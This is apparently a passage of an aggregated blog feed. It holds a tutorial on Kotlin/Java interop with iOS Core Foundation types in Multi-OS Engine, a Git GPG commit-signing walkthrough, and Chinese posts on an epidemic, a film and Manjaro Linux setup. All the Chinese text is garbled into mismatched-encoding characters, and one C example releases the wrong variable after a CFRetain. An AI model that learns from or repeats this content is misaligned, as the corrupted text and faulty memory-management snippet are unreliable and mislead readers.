<p>Êàë‰ª¨ÂèØ‰ª•‰ªé‰∏Ä‰∏™ÂÆûÈôÖÁöÑÈóÆÈ¢òÂºÄÂßãÔºåÂ¶ÇÊûú‰Ω†Êúâ‰∏Ä‰∏™ÊâìÂëºÂôúÁöÑÂÆ§ÂèãÔºå‰Ω†ËØ•ÊÄé‰πàÂäûÔºüÊÉ≥Âà∞ÁöÑÊñπÊ≥ïÊó†ÈùûÊúâ‰∏âÁßç„ÄÇ<br />
1. Èò≤Ê≠¢ÂëºÂôúÂ£∞‰∫ßÁîü„ÄÇÂ∞ÜÂÆ§ÂèãÈöîÁ¶ª„ÄÅ‰∏∫ÂÆ§ÂèãÊ≤ªÁñóÁñæÁóÖ„ÄÅÈòªÊ≠¢ÂÆ§ÂèãÂ§úÊôöÁù°ËßâÔºõ<br />
2. ÈòªÁ¢çÂëºÂôúÂ£∞‰º†Êí≠„ÄÇÂ∞ÜÂÆøËàçÊäΩÊàêÁúüÁ©∫‰ΩøÂæóÂ£∞Èü≥Ê≤°Êúâ‰º†Êí≠Â™í‰ªã„ÄÅÂú®ÂÆ§ÂÜÖÂª∫ÈÄ†Â¢ô‰ΩìÈòªÁ¢çÂ£∞Èü≥‰º†Êí≠Á≠âÔºõ<br />
3. Èò≤Ê≠¢Âô™Â£∞ËøõÂÖ•‰∫∫ËÄ≥„ÄÇÊà¥‰∏äËÄ≥Â°ûÁ≠â„ÄÇ</p>
<p>ÂΩìÊàë‰ª¨Êù•Âà∞‰∫Ü‰º†ÊüìÁóÖ‰º†Êí≠ÁöÑÈóÆÈ¢ò‰∏äÔºå‰πüÊòØÁõ∏ÂêåÁöÑÈÅìÁêÜÔºåÂØπÂ∫îÁùÄ‰πüÊúâ‰∏âÁßçÊñπÊ≥ï„ÄÇ<br />
1. ÈöîÁ¶ª‰º†ÊüìÊ∫ê„ÄÇÂä†Âº∫ÁõëÊµã„ÄÅÂ∞ÜÁ°ÆËØäÊàñÁñë‰ººÁóÖ‰∫∫ËøõË°åÈöîÁ¶ªÊ≤ªÁñóÔºõ<br />
2. Èò≤Ê≠¢ÁñæÁóÖ‰º†Êí≠„ÄÇÂèñÊ∂àÂÖ¨ÂÖ±Ê¥ªÂä®„ÄÅÂØπÂÖ¨ÂÖ±ËÆæÊñΩËøõË°åÂÆöÊúüÊ∂àÊØíÁ≠âÔºõ<br />
3. Èò≤Ê≠¢ÁñæÁóÖËøõÂÖ•‰∫∫‰Ωì„ÄÇÂá∫Èó®Êà¥Âè£ÁΩ©„ÄÅÂã§Ê¥óÊâãÁ≠â„ÄÇ</p>
<h3>ÊéßÂà∂‚ÄúÁóÖ‚Äù</h3>
<p>ÂØπ‰∫é‰º†ÊüìÁóÖÔºåÂ∫∑Â§çÊúâ‰∏§‰∏™ÈÄîÂæÑ„ÄÇ<br />
1. ‰æùËµñ‰∫éËá™Ë∫´ÂÖçÁñ´Á≥ªÁªüÔºõ<br />
2. Â≠òÂú®ÁâπÊïàËçØÁâ©„ÄÇ<br />
ÂΩìÊ≤°ÊúâÁâπÊïàËçØÁöÑÊó∂ÂÄôÔºåÂ∞±‰ªÖ‰ªÖ‰æùËµñ‰∫éËá™Ë∫´ÂÖçÁñ´Á≥ªÁªü‰∫Ü„ÄÇÂÖ∂ÂÆûÊàë‰ª¨Ëá™Ë∫´ÂÖçÁñ´Á≥ªÁªüËøòÊòØÈùûÂ∏∏Âº∫Â§ßÁöÑÔºåÂ∞±ÊòØÂπ≤Ëµ∑Ê¥ªÊù•‰∏çËÆ§‰∫∫ÔºåÊ≠£Â¶ÇÈÇ£Âè•Á¨ëËØùÊâÄËÆ≤ÁöÑÔºå‚ÄúÊàëÊâøËÆ§ÊàëÊúâËµåÁöÑÊàêÂàÜÔºå‰ΩÜÊòØ‰ªäÂ§©‰Ω†ÂíåÁóÖÊØíÂøÖÈ°ªÊ≠ª‰∏Ä‰∏™‚Äù„ÄÇÂú®ÂÖçÁñ´Á≥ªÁªüÂèëÂäüÁöÑÊó∂ÂÄôÔºå‰∫∫‰ΩìËá™Ë∫´‰ºöÊúâÂæàÂ§öÂπ∂ÂèëÁóáÔºåÊØîÂ¶ÇËØ¥ÂèëÁÉßÁ≠â„ÄÇËøô‰∏™Êó∂ÂÄô‰∏∫‰∫ÜÈÅøÂÖçÂπ∂ÂÖçÁñ´Á≥ªÁªüÂπ≤Ê≠ªÔºåÂ∞±ÈúÄË¶ÅÂåªÁñóÊâãÊÆµÁöÑÂπ≤È¢Ñ„ÄÇÊç¢Âè•ËØùËØ¥Ôºå<strong>Âú®Ê≤°ÊúâÁâπÊïàËçØÁöÑÊÉÖÂÜµ‰∏ãÔºåÁé∞‰ª£ÂåªÂ≠¶ÊòØÈùûÂ∏∏Ë¢´Âä®ÁöÑ</strong>„ÄÇÂ¶ÇÊûú‰Ω†Êâõ‰∏ç‰ΩèÂÖçÁñ´Á≥ªÁªü„ÄÅÁóÖÊØí„ÄÅÂåªÁñóÊâãÊÆµ„ÄÅÂπ∂ÂèëÁóá‰∏≠‰ªª‰Ωï‰∏ÄËÄÖÁöÑ‚ÄúÊØíÊÄß‚ÄùÔºåÈÇ£Â∞±‰∏ÄÂëΩÂëúÂëº‰∫ÜÔºåÂèç‰πãÂ∞±ÊòØÊ≤ªÂ•Ω‰∫Ü„ÄÇ</p>
<h3>Ëß£ÈìÉËøòÈ°ªÁ≥ªÈìÉ‰∫∫</h3>
<p>ÁêÜËÆ∫‰∏äËÆ≤ÔºåÂ¶ÇÊûúËÉΩÂ∞ÜÊâÄÊúâÁóÖ‰∫∫ÈöîÁ¶ªÔºåËøô‰∏™‰º†ÊüìÁóÖÂ∞±ÂæóÂà∞ÊéßÂà∂‰∫ÜÔºå‰ΩÜÊòØÂæÄÂæÄÊîøÂ∫úÁöÑÂº∫Â§ßË∞ÉÁî®ËÉΩÂäõÂú®Â§©ÁÅæÈù¢ÂâçÂæÄÂæÄÊòæÂæóÈÇ£‰πàËãçÁôΩÊó†Âäõ„ÄÇ‰ª•ÈùûÂÖ∏‰∏∫‰æãÔºåÊúÄÁªàÂ§©Ê∞îÂèòÁÉ≠‰∫ÜÔºåÈùûÂÖ∏Â§±Âéª‰∫ÜÈÄÇÂÆúÁöÑÁîüÂ≠òÁéØÂ¢ÉÔºåÁÑ∂ÂêéÈùûÂÖ∏Â∞±Ê∂àÂ§±‰∫Ü„ÄÇ</p>
<p>ÂΩìÂπ¥ÁöÑÈùûÂ∏∏Âú®Â§©Ê∞îÂèòÁÉ≠ÁöÑÊó∂ÂÄôÔºåÂ∞±‰∏çÈÄÇÂÆú‰∫ÜÔºåËøôÊ¨°2019-ncovÊòØÂê¶‰πüËÉΩÂ¶ÇÊ≠§Âë¢ÔºüÈô¢Â£´‰ª¨ËÆ≤ÁöÑÂæàÂø´Â∞±‰ºöÂá∫Áé∞ÊãêÁÇπÊòØÂê¶‰ºöÂá∫Áé∞Âë¢Ôºü2020Âπ¥Êúâ‰∫Ü2003Âπ¥Èöæ‰ª•ÊÉ≥Ë±°ÁöÑ‰∫∫Âè£ÊµÅÂä®ÔºåÊòØÂê¶ÊÑèÂë≥ÁùÄËøô‰∏ÄÊ¨°Â∞Ü‰ºöÊõ¥ÈöæÂ∫¶ËøáÂë¢Ôºü</p>
<p>ËÆ©Êó∂Èó¥ÁªôÊàë‰ª¨Á≠îÊ°àÂêß„ÄÇÊàë‰ª¨Áé∞Âú®ËÉΩÂÅöÁöÑ‰πüÊòØÂÅöÂ•ΩËá™Ë∫´Èò≤Êä§ÔºåÂÜ∑ÈùôÂ∫îÂØπÔºåÂà∂ÂÆöËá™Ë∫´ÊèêÂçáÊñπÊ°àÔºå‰∫âÂèñÂú®ËøôÊ¨°‚ÄúËêßÊù°‚Äù‰πãÂêéËÉΩÂ§üÊ≠£Â∏∏ÂêØËà™„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ËãèÁëûËæÖÁöÑ‰∏™‰∫∫ÁΩëÁ´ô]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/381</id>
        <title><![CDATA[ÂøÉÊÄÅËÄå‰∏çÊòØÁúüÁõ∏ÔºàËßÇ„ÄäË¢´ÂÖâÂ∏¶Ëµ∞ÁöÑ‰∫∫„ÄãÊúâÊÑüÔºâ]]></title>
        <updated>2020-01-30T10:17:47+08:00</updated>
        <link href="https://www.suruifu.com/posts/381"/>
        <content type="text/html" src="https://www.suruifu.com/posts/381"><![CDATA[<p><strong><em>Êú¨Êñá‰ΩúËÄÖÂ∞èÊùâ</em></strong><br />
ÁôΩÂÖâÊòØ‰ªÄ‰πàÔºüÊ≤°ÊúâÁªìËÆ∫Ôºå‰πü‰∏çÈúÄË¶ÅÁªìËÆ∫„ÄÇÂõ†‰∏∫ÂÆÉÊòØÂê¶Â≠òÂú®ÁªìËÆ∫Â∑≤Áªè‰∏çÈáçË¶ÅÔºåÈáçË¶ÅÁöÑÊòØ‰∫∫‰ª¨Â¶Ç‰ΩïÁêÜËß£ÂÆÉÔºåÂ¶Ç‰ΩïÈù¢ÂØπÂÆÉ„ÄÇ</p>
<p>ÁªèÂéÜÊäóÊãí„ÄÅÊÅêÊÖå„ÄÅÁ≤æÁ•ûÂøÉÊÄÅÂèóÂà∞‰∏•ÈáçÂΩ±Âìç„ÄÅÂõûÂΩíÊñ∞Â∏∏ÊÄÅ„ÄÇÈáçË¶ÅÁöÑ‰∏çÊòØÁ™ÅÂèë‰∫ã‰ª∂ÁöÑÂèëÁîüËÄåÊòØÂ¶Ç‰ΩïÂØπÂæÖ‰∫ã‰ª∂ÂíåÂ¶Ç‰ΩïÂØπÂæÖËá™Â∑±ÁöÑÂÜÖÂøÉ„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ËãèÁëûËæÖÁöÑ‰∏™‰∫∫ÁΩëÁ´ô]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/moe-native-types.html</id>
        <title><![CDATA[Working with native types: Advanced]]></title>
        <updated>2019-09-22T05:23:17+08:00</updated>
        <link href="https://www.noisyfox.io/moe-native-types.html"/>
        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>



<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>



<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>



<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;

SecAccessControlRef access =
SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
                                &amp;error);

NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];

NSDictionary* attributes =
@{ (id)kSecClass:                   (id)kSecClassKey,
   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
   (id)kSecAttrKeySizeInBits:       @256,
   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
   (id)kSecPrivateKeyAttrs:
       @{ (id)kSecAttrIsPermanent:    @YES,
          (id)kSecAttrApplicationTag:  tag,
          (id)kSecAttrAccessControl:  (__bridge id)access
        },
   };

SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
                                             &amp;error);</pre>



<p>The corresponding Kotlin code will be:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)
val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)

// Helper function to convert a CF type to Cocoa type
fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)

val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()

val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs

// Cast NSDictionary to CFDictionaryRef
val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)

val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>



<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)

val attributes = mapOf&lt;Any,Any>(
    Security.kSecClass() to Security.kSecClassKey(),
    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
    Security.kSecAttrKeySizeInBits() to 256,
    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
        Security.kSecAttrIsPermanent() to true,
        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
        Security.kSecAttrAccessControl() to access
    )
).toNSDictionary()

val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>



<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>



<h1>Toll-Free Bridging &amp; Memory Management</h1>



<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>



<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>



<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>



<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>



<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>



<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>



<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>



<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>



<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
    "https://www.noisyfox.io", kCFStringEncodingUTF8);

/* Do something with urlStr here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));

/* Do something with title here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->

    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
        /* Do something with title here. */
    }
}
// CFRelease is automatically called when block returns
</pre>



<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>



<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>



<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()

    /* Do something with title here. */
}
// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
</pre>



<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>



<h2 id="type-bridging">Type Bridging</h2>



<p>WIP</p>



<h1>Misc</h1>



<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>



<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>



<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>



<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>



<h1>Discussion</h1>



<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>ÔºåÈ¶ñÂèë‰∫é<a rel="nofollow" href="https://www.noisyfox.io">ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù</a>„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/git-initialization/</id>
        <title><![CDATA[Git initialization]]></title>
        <updated>2019-09-01T10:37:13+08:00</updated>
        <link href="https://blog.triplez.cn/git-initialization/"/>
        <content type="text/html" src="https://blog.triplez.cn/git-initialization/"><![CDATA[<ul>
<li>Change <code>Git</code> default settings;</li>
<li>Use <code>GPG</code> key to sign the <code>Git</code> commits.</li>
</ul>
<h2>Step by step</h2>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global core.editor "vim"


# config your identity
git config --global user.email "YOUR_EMAIL"
git config --global user.name "YOUR_NAME"

# enable gpg signed commit
git config --global commit.gpgsign true

# generate gpg key
## git &gt;= 2.1.17
gpg --full-generate-key
# or gpg --gen-key
## git &lt; 2.1.17
gpg --default-new-key-algo rsa4096 --gen-key

# check your key id
$ gpg --list-secret-keys --keyid-format LONG
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
/home/triplez/.gnupg/pubring.kbx
--------------------------------
sec   rsa4096/96B4168C3D454E11 2018-11-28 [SC]
      6B0B48B063F8F592CE9006DE96B4168C3D454E11
uid                 [ultimate] Zhenzhen Zhao (my gpg) &lt;me@triplez.cn&gt;
ssb   rsa4096/435B8EB04CBF8E8D 2018-11-28 [E]

gpg --armor --export 96B4168C3D454E11
# copy your GPG key, beginning with -----BEGIN PGP PUBLIC KEY BLOCK----- and ending with -----END PGP PUBLIC KEY BLOCK-----, then add it to the GitHub

# set user to sign with this gpg key
git config --global user.signingkey 96B4168C3D454E11
</code></pre>
<h2>References</h2>
<p><a href="https://help.github.com/articles/generating-a-new-gpg-key/">Generating a new GPG key</a><br />
<a href="https://stackoverflow.com/questions/52808365/git-error-gpg-failed-to-sign-the-data-on-linux">Git error: gpg failed to sign the data on Linux</a></p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/git-initialization/">Git initialization</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/manjaro-quick-start/</id>
        <title><![CDATA[Â∞ÜÂπ≤ÂáÄÁöÑ Manjaro Âø´ÈÄüÈÖçÁΩÆ‰∏∫Â∑•‰ΩúÁéØÂ¢É]]></title>
        <updated>2019-08-26T14:58:12+08:00</updated>
        <link href="https://blog.triplez.cn/manjaro-quick-start/"/>
        <content type="text/html" src="https://blog.triplez.cn/manjaro-quick-start/"><![CDATA[<h2><span class="ez-toc-section" id="i">ÂàùÂßãÂåñÈÖçÁΩÆ</span></h2>
<p>ÂÖàÈÖçÁΩÆÈïúÂÉèÊ∫êÔºåManjaro Êó©Â∑≤Â∏ÆÊàë‰ª¨ÂÆâÊéíÂ•ΩËøô‰∏ÄÂàáÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-sh"># ÈÄâÂèñÂΩì‰∏ãÂú®ÂõΩÂÜÖÊúÄÂø´ÁöÑÊ∫ê
$ sudo pacman-mirrors -i -c China -m rank
</code></pre>
<h3><span class="ez-toc-section" id="i-2">Ê∑ªÂä†ÂõΩÂÜÖËΩØ‰ª∂Ê∫ê</span></h3>
<p>‰øÆÊîπ <code>/etc/pacman.conf</code> ÔºåÊ∑ªÂä†Â¶Ç‰∏ãËØ≠Âè•ÔºàÊ≠§Â§Ñ‰ΩøÁî®Ê∏ÖÂçé TUNA Ê∫êÔºâÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">[archlinuxcn]
SigLevel= TrustedOnly
Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch
</code></pre>
<blockquote><p>
  Ê≠§Â§ÑÂª∫ËÆÆÂÖà <code>sudo pacman -S vim</code>  üòõ
</p></blockquote>
<p>ÂÆâË£ÖÂØÜÈí•Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syu archlinuxcn-keyring
</code></pre>
<blockquote><p>
  ÂèØËÉΩÈÅáÂà∞ <strong>Unable to lock database</strong> ÈîôËØØÔºå<a href="https://forum.manjaro.org/t/solved-not-able-to-update-unable-to-lock-database/45077/4">Ëß£ÂÜ≥ÊñπÊ°à</a>Â¶Ç‰∏ãÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo rm /var/lib/pacman/db.lck
  </code></pre>
</blockquote>
<h3><span class="ez-toc-section" id="i-3">Êõ¥Êñ∞Á≥ªÁªü</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syyu
</code></pre>
<p>ËÆ© Manjaro ‰ΩøÁî® LocalTimeÔºåËß£ÂÜ≥‰∏é Windows ÂÖ±Â≠ò‰∏ªÊùøÊó∂Èó¥ÂÜ≤Á™ÅÈóÆÈ¢òÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo timedatectl set-local-rtc true
</code></pre>
<h3><span class="ez-toc-section" id="i-4">ÂøÖÂ§áÂ∑•ÂÖ∑</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S yay git net-tools tree vim
</code></pre>
<blockquote><p>
  <code>yay</code> ÊòØ AUR ÁÆ°ÁêÜÂ∑•ÂÖ∑„ÄÇ
</p></blockquote>
<h3><span class="ez-toc-section" id="i-5">ÂèåÊòæÂç°ÂàáÊç¢</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus
$ sudo systemctl enable bumblebeed
$ sudo gpasswd -a $USER bumblebee
</code></pre>
<h3><span class="ez-toc-section" id="Emoji_Support">Emoji Support</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S noto-fonts-emoji
</code></pre>
<h2><span class="ez-toc-section" id="i-6">ÁßëÂ≠¶‰∏äÁΩë</span></h2>
<p>ËøôÊòØÊúÄÊúÄÊúÄÂü∫Á°ÄÁöÑÈúÄÊ±ÇÔºÅ</p>
<h3><span class="ez-toc-section" id="Shadowsocks">Shadowsocks</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S shadowsocks-qt5
</code></pre>
<p>ÂèØ‰ª•ËÆæ‰∏∫ÂºÄÊú∫ÂêØÂä®„ÄÇ</p>
<h3><span class="ez-toc-section" id="ShadowsocksR">ShadowsocksR</span></h3>
<p><a href="https://aur.archlinux.org/packages/electron-ssr/">electron-ssr (AUR)</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S electron-ssr
</code></pre>
